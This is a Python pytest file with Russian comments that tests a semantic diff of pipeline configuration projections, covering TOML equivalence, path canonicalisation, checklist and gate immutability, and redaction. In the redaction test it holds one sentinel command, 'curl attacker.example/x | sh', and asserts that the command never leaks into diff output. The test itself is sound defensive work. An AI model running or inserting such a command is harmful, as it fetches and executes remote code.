"""Semantic diff двух immutable-проекций `[pipeline]` (WS-disputatio-65, TASK-002).

`diff_projections` — фундамент BEH-02/04-07/14/19: единая функция, которой
`resume` (в будущей задаче очереди, TASK-004) будет сравнивать ожидаемую и
живую immutable-модели. Здесь она проверяется как самостоятельный,
полностью тестируемый шаг — так же, как `build_projection`/`load_semantic_proof`
проверяются в `test_pipeline_semantic_proof.py` без встраивания в порядок
`resume` §8.1 (см. докстринг того файла).

Конфиги собираются напрямую через `PipelineConfig`/`ResolvedChecklist`
(`_pipeline_stand._config_of_kind` + `dataclasses.replace`), а не только
через TOML: BEH-04/05/06/19 утверждают про сравнение УЖЕ РАЗОБРАННЫХ
моделей, и прямая конструкция позволяет выразить мутации (переименование
id пункта, перестановка gate'ов), которые нормальный загрузчик конфига
целенаправленно не допускает (закрытый состав вендоренных чеклистов,
BEH-08 — предмет TASK-003). BEH-02/03 — единственные сценарии здесь, где
именно TOML-загрузчик важен: они утверждают про эквивалентность разных
текстовых представлений одного и того же смысла.
"""

import dataclasses
import json
from pathlib import Path
from typing import Any

import pytest

from disputatio.contracts import PipelineKind, ResolvedChecklist
from disputatio.runtime.pipeline_config import (
    DEFAULT_MAX_ARCHITECTURAL_RETURNS,
    PipelineConfig,
    load_pipeline_config,
)
from disputatio.runtime.pipeline_semantic_proof import (
    PIPELINE_CONFIG_FIELD_CLASS,
    ProjectionDiff,
    build_projection,
    diff_projections,
)
from disputatio.verifier import GateSpec

from ._pipeline_stand import _config_of_kind


def _write(directory: Path, name: str, text: str) -> Path:
    path = directory / name
    path.write_text(text, encoding="utf-8")
    return path


def _pair_config(tmp_path: Path, **overrides: Any) -> PipelineConfig:
    config = _config_of_kind(
        PipelineKind.PAIR,
        anchor_path=tmp_path / "anchors",
        max_architectural_returns=DEFAULT_MAX_ARCHITECTURAL_RETURNS,
        doc_checklist_order=("B1", "B3"),
    )
    return dataclasses.replace(config, **overrides) if overrides else config


def _document_config(tmp_path: Path, **overrides: Any) -> PipelineConfig:
    config = _config_of_kind(
        PipelineKind.DOCUMENT,
        anchor_path=tmp_path / "anchors",
        max_architectural_returns=DEFAULT_MAX_ARCHITECTURAL_RETURNS,
        doc_checklist_order=("B1", "B3"),
    )
    return dataclasses.replace(config, **overrides) if overrides else config


# ---------------------------------------------------------------------------
# BEH-02 — эквивалентное TOML-представление даёт ту же модель
# ---------------------------------------------------------------------------

_PAIR_BASELINE_TOML = """
[pipeline]
spec_path = "docs/spec.md"
plan_path = "docs/plan.md"
"""

# Комментарии, лишние пробелы, литеральные кавычки вместо базовых строк,
# незначимый порядок TOML-таблиц (пустые override-таблицы чеклистов
# объявлены раньше [pipeline]) и явная запись значения, равного default.
_PAIR_EQUIVALENT_TOML = """
# то же самое, другими словами
[pipeline.checklists.pair]
[pipeline.checklists.spec]

[pipeline]
plan_path    =    'docs/plan.md'   # literal-строка, не basic
spec_path = "docs/spec.md"
max_architectural_returns = 2
"""

_DOCUMENT_BASELINE_TOML = """
[pipeline]
document_path = "docs/charter.md"

[pipeline.checklists.doc]
findings_item = "B3"

[pipeline.checklists.doc.items]
B1 = "каждый BEH-NN несёт traces:"
B3 = "нет blocker/major-находок"
"""

# Тот же смысл: другой порядок таблиц (items раньше самой [pipeline]),
# другие кавычки, лишние пробелы вокруг '='.
_DOCUMENT_EQUIVALENT_TOML = """
[pipeline.checklists.doc.items]
B1      =    'каждый BEH-NN несёт traces:'
B3 = "нет blocker/major-находок"

[pipeline.checklists.doc]
findings_item = "B3"

[pipeline]
document_path    =   "docs/charter.md"
"""


@pytest.mark.parametrize(
    "baseline_text, equivalent_text",
    [
        pytest.param(_PAIR_BASELINE_TOML, _PAIR_EQUIVALENT_TOML, id="pair"),
        pytest.param(_DOCUMENT_BASELINE_TOML, _DOCUMENT_EQUIVALENT_TOML, id="document"),
    ],
)
def test_equivalent_toml_and_explicit_defaults_have_one_projection(
    tmp_path: Path, baseline_text: str, equivalent_text: str
) -> None:
    """Разное форматирование одного смысла даёт идентичную проекцию (FR-02).

    Не только `diff_projections(...) == []` (см. также
    `tests/test_task_002_red.py`), но и `build_projection` возвращает
    структурно РАВНЫЕ словари — сильнее, чем «сравнение их не различает»:
    доказывает, что канонизация схлопывает форматирование ДО сравнения, а
    не полагается на diff, который прощает несущественные различия.
    """
    baseline = load_pipeline_config(_write(tmp_path, "baseline.toml", baseline_text))
    equivalent = load_pipeline_config(
        _write(tmp_path, "equivalent.toml", equivalent_text)
    )

    expected = build_projection(baseline)
    live = build_projection(equivalent)

    assert expected == live
    assert diff_projections(expected, live) == []


def test_repeated_diff_of_same_equivalent_pair_is_stable(tmp_path: Path) -> None:
    """Повтор сравнения даёт тот же (пустой) результат — FR-17.

    `diff_projections` — чистая функция над уже разобранными проекциями:
    повторный вызов с теми же аргументами не должен зависеть ни от
    порядка предыдущих вызовов, ни от какого-либо скрытого состояния.
    """
    baseline = load_pipeline_config(
        _write(tmp_path, "baseline.toml", _PAIR_BASELINE_TOML)
    )
    equivalent = load_pipeline_config(
        _write(tmp_path, "equivalent.toml", _PAIR_EQUIVALENT_TOML)
    )
    expected = build_projection(baseline)
    live = build_projection(equivalent)

    assert diff_projections(expected, live) == diff_projections(expected, live)
    assert diff_projections(expected, live) == []


# ---------------------------------------------------------------------------
# BEH-03 — пути канонизируются без привязки к машине
# ---------------------------------------------------------------------------


def test_document_paths_are_relative_posix_and_machine_independent(
    tmp_path: Path,
) -> None:
    """Проекция несёт путь как относительную POSIX-строку (BEH-03, FR-03).

    Два конфига с одинаковым `[pipeline]`, но под ДВУМЯ разными workspace
    root'ами (модель двух разных машин), дают одинаковую проекцию — значит,
    в ней нет абсолютного префикса конкретной машины. Обратное тоже верно:
    два РАЗНЫХ относительных пути — это разные значения, даже если легко
    вообразить, что оба "могли бы" указывать на тот же файл: сравнение
    работает по канонической строке пути, не по файловой системе (никакого
    `resolve()`), поэтому оно ничего не знает про то, один это файл или два.
    """
    machine_a = tmp_path / "machine-a" / "workspace"
    machine_b = tmp_path / "totally" / "different" / "machine-b"
    machine_a.mkdir(parents=True)
    machine_b.mkdir(parents=True)

    config_a = load_pipeline_config(
        _write(machine_a, "config.toml", _PAIR_BASELINE_TOML)
    )
    config_b = load_pipeline_config(
        _write(machine_b, "config.toml", _PAIR_BASELINE_TOML)
    )
    projection_a = build_projection(config_a)
    projection_b = build_projection(config_b)

    assert projection_a == projection_b
    assert diff_projections(projection_a, projection_b) == []
    assert projection_a["spec_path"] == "docs/spec.md"
    assert projection_a["plan_path"] == "docs/plan.md"

    serialized = json.dumps(projection_a)
    assert str(machine_a) not in serialized
    assert str(machine_b) not in serialized
    assert "workspace" not in serialized

    renamed_text = _PAIR_BASELINE_TOML.replace(
        'spec_path = "docs/spec.md"', 'spec_path = "documentation/spec.md"'
    )
    renamed = load_pipeline_config(_write(machine_a, "renamed.toml", renamed_text))
    diffs = diff_projections(projection_a, build_projection(renamed))

    assert [diff.field for diff in diffs] == ["spec_path"]
    assert diffs[0].old == "docs/spec.md"
    assert diffs[0].new == "documentation/spec.md"


# ---------------------------------------------------------------------------
# BEH-04 — полная семантика pair-чеклистов неизменяема
# ---------------------------------------------------------------------------


def test_pair_checklist_semantics_are_immutable(tmp_path: Path) -> None:
    """Любое изменение состава/порядка/текста/роли — drift (BEH-04, FR-04).

    Восемь отдельных мутаций contour'ов `pair` и `spec`: добавление,
    удаление, переименование id, перестановка порядка, правка текста и
    правка `findings_item`. Тексты пунктов — предмет BEH-14: путь
    называется, содержимое остаётся `None` (редактировано).
    """
    baseline = _pair_config(tmp_path)
    expected = build_projection(baseline)
    pair = baseline.checklists["pair"]

    def diffs_for(contour: str, checklist: ResolvedChecklist) -> list[ProjectionDiff]:
        live_config = dataclasses.replace(
            baseline, checklists={**baseline.checklists, contour: checklist}
        )
        return diff_projections(expected, build_projection(live_config))

    added = dataclasses.replace(
        pair, order=(*pair.order, "P6"), texts={**pair.texts, "P6": "новый пункт"}
    )
    assert {d.field for d in diffs_for("pair", added)} == {
        "checklists.pair.order",
        "checklists.pair.texts.P6",
    }

    dropped_id = pair.order[-1]
    removed = dataclasses.replace(
        pair,
        order=pair.order[:-1],
        texts={k: v for k, v in pair.texts.items() if k != dropped_id},
    )
    removed_fields = {d.field for d in diffs_for("pair", removed)}
    assert "checklists.pair.order" in removed_fields
    assert f"checklists.pair.texts.{dropped_id}" in removed_fields

    old_id = pair.order[0]
    renamed = dataclasses.replace(
        pair,
        order=("P0", *pair.order[1:]),
        texts={
            **{k: v for k, v in pair.texts.items() if k != old_id},
            "P0": pair.texts[old_id],
        },
    )
    renamed_fields = {d.field for d in diffs_for("pair", renamed)}
    assert "checklists.pair.order" in renamed_fields
    assert f"checklists.pair.texts.{old_id}" in renamed_fields
    assert "checklists.pair.texts.P0" in renamed_fields

    reordered = dataclasses.replace(pair, order=tuple(reversed(pair.order)))
    assert [d.field for d in diffs_for("pair", reordered)] == ["checklists.pair.order"]

    retexted = dataclasses.replace(
        pair, texts={**pair.texts, pair.order[0]: "другой текст"}
    )
    retexted_diffs = diffs_for("pair", retexted)
    assert [d.field for d in retexted_diffs] == [
        f"checklists.pair.texts.{pair.order[0]}"
    ]
    assert retexted_diffs[0].old is None
    assert retexted_diffs[0].new is None

    refound = dataclasses.replace(pair, findings_item="P1")
    assert [d.field for d in diffs_for("pair", refound)] == [
        "checklists.pair.findings_item"
    ]

    spec = baseline.checklists["spec"]
    spec_retexted = dataclasses.replace(
        spec, texts={**spec.texts, spec.order[0]: "иначе"}
    )
    assert [d.field for d in diffs_for("spec", spec_retexted)] == [
        f"checklists.spec.texts.{spec.order[0]}"
    ]


# ---------------------------------------------------------------------------
# BEH-05 — полная семантика document-чеклиста неизменяема
# ---------------------------------------------------------------------------


def test_document_checklist_semantics_are_immutable(tmp_path: Path) -> None:
    """Любое изменение операторского `doc`-чеклиста — drift (BEH-05, FR-04)."""
    baseline = _document_config(tmp_path)
    expected = build_projection(baseline)
    doc = baseline.checklists["doc"]

    def diffs_for(checklist: ResolvedChecklist) -> list[ProjectionDiff]:
        live_config = dataclasses.replace(baseline, checklists={"doc": checklist})
        return diff_projections(expected, build_projection(live_config))

    added = dataclasses.replace(
        doc, order=(*doc.order, "B9"), texts={**doc.texts, "B9": "новый критерий"}
    )
    assert {d.field for d in diffs_for(added)} == {
        "checklists.doc.order",
        "checklists.doc.texts.B9",
    }

    reordered = dataclasses.replace(doc, order=tuple(reversed(doc.order)))
    assert [d.field for d in diffs_for(reordered)] == ["checklists.doc.order"]

    retexted = dataclasses.replace(
        doc, texts={**doc.texts, doc.order[0]: "другой критерий"}
    )
    retexted_diffs = diffs_for(retexted)
    assert [d.field for d in retexted_diffs] == [f"checklists.doc.texts.{doc.order[0]}"]
    assert retexted_diffs[0].old is None
    assert retexted_diffs[0].new is None

    refound = dataclasses.replace(doc, findings_item=doc.order[0])
    assert [d.field for d in diffs_for(refound)] == ["checklists.doc.findings_item"]

    dropped_id = doc.order[-1]
    removed = dataclasses.replace(
        doc,
        order=doc.order[:-1],
        texts={k: v for k, v in doc.texts.items() if k != dropped_id},
    )
    removed_fields = {d.field for d in diffs_for(removed)}
    assert "checklists.doc.order" in removed_fields
    assert f"checklists.doc.texts.{dropped_id}" in removed_fields


# ---------------------------------------------------------------------------
# BEH-06 — все свойства и порядок дополнительных gates неизменяемы
# ---------------------------------------------------------------------------


def test_gate_order_and_all_properties_are_immutable(tmp_path: Path) -> None:
    """Добавление/удаление/перестановка/правка любого свойства gate — drift.

    (BEH-06, FR-05). `cmd` редактируется (BEH-14): путь называется,
    команда — никогда, даже старая.
    """
    lint = GateSpec(name="lint", cmd="ruff check .", enabled=True)
    types = GateSpec(name="types", cmd="pyrefly check", enabled=True)
    baseline = _pair_config(tmp_path, extra_gates=(lint, types))
    expected = build_projection(baseline)

    def diffs_for(gates: tuple[GateSpec, ...]) -> list[ProjectionDiff]:
        return diff_projections(
            expected,
            build_projection(dataclasses.replace(baseline, extra_gates=gates)),
        )

    assert diffs_for((lint, types)) == []

    reordered = diffs_for((types, lint))
    assert {d.field for d in reordered} == {
        "gates[0].name",
        "gates[0].cmd",
        "gates[1].name",
        "gates[1].cmd",
    }
    for diff in reordered:
        if diff.field.endswith(".cmd"):
            assert diff.old is None
            assert diff.new is None

    extra = GateSpec(name="extra", cmd="pytest", enabled=True)
    added = diffs_for((lint, types, extra))
    added_fields = sorted(d.field for d in added)
    assert added_fields == ["gates[2].cmd", "gates[2].enabled", "gates[2].name"]
    name_diff = next(d for d in added if d.field == "gates[2].name")
    assert name_diff.old is None
    assert name_diff.new == "extra"
    cmd_diff = next(d for d in added if d.field == "gates[2].cmd")
    assert cmd_diff.old is None
    assert cmd_diff.new is None

    removed = diffs_for((lint,))
    assert {d.field for d in removed} == {
        "gates[1].name",
        "gates[1].cmd",
        "gates[1].enabled",
    }

    renamed_cmd = diffs_for(
        (dataclasses.replace(lint, cmd="ruff check . --fix"), types)
    )
    assert [d.field for d in renamed_cmd] == ["gates[0].cmd"]
    assert renamed_cmd[0].old is None
    assert renamed_cmd[0].new is None

    disabled = diffs_for((dataclasses.replace(lint, enabled=False), types))
    assert [d.field for d in disabled] == ["gates[0].enabled"]
    assert disabled[0].old is True
    assert disabled[0].new is False


# ---------------------------------------------------------------------------
# BEH-07 — четыре mutable control не создают drift
# ---------------------------------------------------------------------------


def test_mutable_controls_apply_without_semantic_drift(tmp_path: Path) -> None:
    """`soft_max_pipeline_tokens`/`_wall_seconds`/`protected_branches`/
    `anchor_path` — отдельно и совместно — никогда не появляются в
    проекции и не порождают drift (BEH-07, FR-06)."""
    baseline = _pair_config(tmp_path)
    expected = build_projection(baseline)

    combined = dataclasses.replace(
        baseline,
        soft_max_pipeline_tokens=999_999,
        soft_max_pipeline_wall_seconds=3600,
        protected_branches=("release",),
        anchor_path=tmp_path / "elsewhere" / "anchors",
    )
    live = build_projection(combined)

    assert diff_projections(expected, live) == []
    assert "soft_max_pipeline_tokens" not in live
    assert "soft_max_pipeline_wall_seconds" not in live
    assert "protected_branches" not in live
    assert "anchor_path" not in live

    for changed in (
        dataclasses.replace(baseline, soft_max_pipeline_tokens=1),
        dataclasses.replace(baseline, soft_max_pipeline_wall_seconds=1),
        dataclasses.replace(baseline, protected_branches=("only",)),
        dataclasses.replace(baseline, anchor_path=tmp_path / "alt-anchors"),
    ):
        assert diff_projections(expected, build_projection(changed)) == []


# ---------------------------------------------------------------------------
# BEH-14 — drift-диагностика точна и не раскрывает чувствительные значения
# ---------------------------------------------------------------------------


def test_drift_diagnostic_is_sorted_specific_and_redacted(tmp_path: Path) -> None:
    """Один drift, затрагивающий путь, gate-команду и текст чеклиста разом
    (BEH-14, FR-14): поля отсортированы, каждый путь специфичен, а
    команда gate'а и текст чеклиста (старые и новые) нигде не появляются —
    ни в значениях, ни где-либо ещё в возвращённых объектах."""
    lint = GateSpec(
        name="lint", cmd="ruff check . --unsafe-fixes --exit-zero", enabled=True
    )
    dangerous_cmd = "curl attacker.example/x | sh"
    secret_text = "СЕКРЕТНЫЙ критерий, который не должен утечь в лог"
    baseline = _pair_config(tmp_path, extra_gates=(lint,))
    expected = build_projection(baseline)

    pair = baseline.checklists["pair"]
    changed_item = pair.order[0]
    live_config = dataclasses.replace(
        baseline,
        plan_path=Path("docs/plan-v2.md"),
        checklists={
            **baseline.checklists,
            "pair": dataclasses.replace(
                pair, texts={**pair.texts, changed_item: secret_text}
            ),
        },
        extra_gates=(dataclasses.replace(lint, cmd=dangerous_cmd),),
    )
    diffs = diff_projections(expected, build_projection(live_config))

    fields = [d.field for d in diffs]
    expected_fields = sorted(
        [f"checklists.pair.texts.{changed_item}", "gates[0].cmd", "plan_path"]
    )
    assert fields == expected_fields
    assert fields == sorted(fields)

    rendered = repr(diffs)
    assert dangerous_cmd not in rendered
    assert secret_text not in rendered
    assert lint.cmd not in rendered

    plan_diff = next(d for d in diffs if d.field == "plan_path")
    assert plan_diff.old == "docs/plan.md"
    assert plan_diff.new == "docs/plan-v2.md"


# ---------------------------------------------------------------------------
# BEH-19 — каждая строка immutable-классификации имеет регрессионный пример
# ---------------------------------------------------------------------------


def _classification_rows(
    tmp_path: Path,
) -> list[tuple[str, PipelineConfig, PipelineConfig, str | None]]:
    """Одна строка на каждую запись закрытой таблицы WS-65 requirements.

    Четвёртый элемент — путь, который ОБЯЗАН появиться среди расхождений
    (immutable-строки), либо `None`, если это mutable-строка и изменение
    ОБЯЗАНО остаться без drift.
    """
    gate = GateSpec(name="lint", cmd="ruff check .", enabled=True)
    pair = _pair_config(tmp_path, extra_gates=(gate,))
    doc = _document_config(tmp_path, extra_gates=(gate,))
    pair_checklist = pair.checklists["pair"]
    spec_checklist = pair.checklists["spec"]
    doc_checklist = doc.checklists["doc"]

    return [
        ("kind", pair, doc, "kind"),
        (
            "spec_path",
            pair,
            dataclasses.replace(pair, spec_path=Path("docs/spec-v2.md")),
            "spec_path",
        ),
        (
            "plan_path",
            pair,
            dataclasses.replace(pair, plan_path=Path("docs/plan-v2.md")),
            "plan_path",
        ),
        (
            "document_path",
            doc,
            dataclasses.replace(doc, document_path=Path("docs/charter-v2.md")),
            "document_path",
        ),
        (
            "max_architectural_returns",
            pair,
            dataclasses.replace(pair, max_architectural_returns=9),
            "max_architectural_returns",
        ),
        (
            "max_architectural_returns_explicit_default_is_no_drift",
            pair,
            dataclasses.replace(
                pair, max_architectural_returns=DEFAULT_MAX_ARCHITECTURAL_RETURNS
            ),
            None,
        ),
        (
            "checklists.pair.order",
            pair,
            dataclasses.replace(
                pair,
                checklists={
                    **pair.checklists,
                    "pair": dataclasses.replace(
                        pair_checklist, order=tuple(reversed(pair_checklist.order))
                    ),
                },
            ),
            "checklists.pair.order",
        ),
        (
            "checklists.pair.texts",
            pair,
            dataclasses.replace(
                pair,
                checklists={
                    **pair.checklists,
                    "pair": dataclasses.replace(
                        pair_checklist,
                        texts={
                            **pair_checklist.texts,
                            pair_checklist.order[0]: "иначе",
                        },
                    ),
                },
            ),
            f"checklists.pair.texts.{pair_checklist.order[0]}",
        ),
        (
            "checklists.pair.findings_item",
            pair,
            dataclasses.replace(
                pair,
                checklists={
                    **pair.checklists,
                    "pair": dataclasses.replace(pair_checklist, findings_item="P1"),
                },
            ),
            "checklists.pair.findings_item",
        ),
        (
            "checklists.spec.order",
            pair,
            dataclasses.replace(
                pair,
                checklists={
                    **pair.checklists,
                    "spec": dataclasses.replace(
                        spec_checklist, order=tuple(reversed(spec_checklist.order))
                    ),
                },
            ),
            "checklists.spec.order",
        ),
        (
            "checklists.spec.texts",
            pair,
            dataclasses.replace(
                pair,
                checklists={
                    **pair.checklists,
                    "spec": dataclasses.replace(
                        spec_checklist,
                        texts={
                            **spec_checklist.texts,
                            spec_checklist.order[0]: "иначе",
                        },
                    ),
                },
            ),
            f"checklists.spec.texts.{spec_checklist.order[0]}",
        ),
        (
            "checklists.spec.findings_item",
            pair,
            dataclasses.replace(
                pair,
                checklists={
                    **pair.checklists,
                    "spec": dataclasses.replace(spec_checklist, findings_item="S2"),
                },
            ),
            "checklists.spec.findings_item",
        ),
        (
            "checklists.doc.items.order",
            doc,
            dataclasses.replace(
                doc,
                checklists={
                    "doc": dataclasses.replace(
                        doc_checklist, order=tuple(reversed(doc_checklist.order))
                    )
                },
            ),
            "checklists.doc.order",
        ),
        (
            "checklists.doc.items.text",
            doc,
            dataclasses.replace(
                doc,
                checklists={
                    "doc": dataclasses.replace(
                        doc_checklist,
                        texts={
                            **doc_checklist.texts,
                            doc_checklist.order[0]: "иначе",
                        },
                    )
                },
            ),
            f"checklists.doc.texts.{doc_checklist.order[0]}",
        ),
        (
            "checklists.doc.findings_item",
            doc,
            dataclasses.replace(
                doc,
                checklists={
                    "doc": dataclasses.replace(
                        doc_checklist, findings_item=doc_checklist.order[0]
                    )
                },
            ),
            "checklists.doc.findings_item",
        ),
        (
            "gates.order",
            pair,
            dataclasses.replace(
                pair,
                extra_gates=(GateSpec(name="second", cmd="pytest", enabled=True), gate),
            ),
            "gates[0].name",
        ),
        (
            "gates.name",
            pair,
            dataclasses.replace(
                pair, extra_gates=(dataclasses.replace(gate, name="renamed"),)
            ),
            "gates[0].name",
        ),
        (
            "gates.cmd",
            pair,
            dataclasses.replace(
                pair, extra_gates=(dataclasses.replace(gate, cmd="ruff check . --fix"),)
            ),
            "gates[0].cmd",
        ),
        (
            "gates.enabled",
            pair,
            dataclasses.replace(
                pair, extra_gates=(dataclasses.replace(gate, enabled=False),)
            ),
            "gates[0].enabled",
        ),
        (
            "soft_max_pipeline_tokens_is_mutable",
            pair,
            dataclasses.replace(pair, soft_max_pipeline_tokens=42),
            None,
        ),
        (
            "soft_max_pipeline_wall_seconds_is_mutable",
            pair,
            dataclasses.replace(pair, soft_max_pipeline_wall_seconds=42),
            None,
        ),
        (
            "protected_branches_is_mutable",
            pair,
            dataclasses.replace(pair, protected_branches=("only",)),
            None,
        ),
        (
            "anchor_path_is_mutable",
            pair,
            dataclasses.replace(pair, anchor_path=tmp_path / "elsewhere-anchors"),
            None,
        ),
    ]


def test_every_immutable_classification_row_is_enforced(tmp_path: Path) -> None:
    """Каждая строка закрытой таблицы (WS-65 requirements) — своя регрессия.

    (BEH-19, FR-02/03/04/05/18): baseline сравнивается с независимо
    пересобранной копией самого себя (без изменений — нет drift, включая
    явную запись значения, равного default), а затем с ОДНОЙ мутацией —
    immutable-строка обязана дать drift, ровно называющий свой путь;
    mutable-строка обязана остаться без drift несмотря на изменение.
    """
    for label, baseline, mutated, expected_field in _classification_rows(tmp_path):
        expected = build_projection(baseline)
        assert diff_projections(expected, build_projection(baseline)) == [], label

        diffs = diff_projections(expected, build_projection(mutated))
        fields = {d.field for d in diffs}
        if expected_field is None:
            assert fields == set(), label
        else:
            assert expected_field in fields, label


# ---------------------------------------------------------------------------
# BEH-21 — классификация и исполнимый контракт документированы единообразно
# ---------------------------------------------------------------------------


def test_schema_parser_and_canonicalizer_classifications_match(tmp_path: Path) -> None:
    """`PIPELINE_CONFIG_FIELD_CLASS` — единственная декларативная схема
    (BEH-21, FR-07, NFR-08): её ключи обязаны РОВНО совпадать с полями
    dataclass'а `PipelineConfig` — добавление нового поля без записи в
    классификации ломает этот тест раньше, чем поле молча станет
    mutable по умолчанию. Mutable-поля из той же таблицы нигде не
    просачиваются в проекцию, которую строит `build_projection`.
    """
    dataclass_fields = {f.name for f in dataclasses.fields(PipelineConfig)}
    assert dataclass_fields == set(PIPELINE_CONFIG_FIELD_CLASS)

    mutable_fields = {
        name for name, cls in PIPELINE_CONFIG_FIELD_CLASS.items() if cls == "mutable"
    }
    assert mutable_fields == {
        "soft_max_pipeline_tokens",
        "soft_max_pipeline_wall_seconds",
        "protected_branches",
        "anchor_path",
    }
    immutable_fields = {
        name for name, cls in PIPELINE_CONFIG_FIELD_CLASS.items() if cls == "immutable"
    }
    assert immutable_fields == {
        "kind",
        "spec_path",
        "plan_path",
        "document_path",
        "max_architectural_returns",
        "checklists",
        "extra_gates",
    }

    projection = build_projection(_pair_config(tmp_path))
    assert not (mutable_fields & projection.keys())
